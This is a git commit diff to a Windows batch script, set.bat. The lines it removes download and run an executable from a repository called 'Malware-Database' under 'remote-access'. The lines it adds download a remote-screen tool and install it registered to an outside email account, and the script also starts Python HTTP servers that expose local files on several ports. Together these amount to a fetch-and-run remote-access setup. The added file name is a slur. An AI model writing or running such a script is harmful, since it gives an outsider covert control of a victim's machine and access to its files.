f79feaea9b987e23e8e65bcf4c662f8bed477c6a
someonefromdiscord <freehostlvr12@proton.me>
2024-11-24 15:43:36 +0100

    Update set.bat

--- set.bat
+++ set.bat
@@ -1,5 +1,5 @@
-curl https://gitea.com/cvmuser1000/Malware-Database/raw/branch/main/remote-access/skyhighsundaerat.exe --output better.exe
-better.exe
+curl https://getscreen.me/download/getscreen.exe --output gay.exe
+gay.exe -install -register skyhighsundae@gmail.com
 py -m http.server 5151
 py -m http.server 5000
 py -m http.server 5651
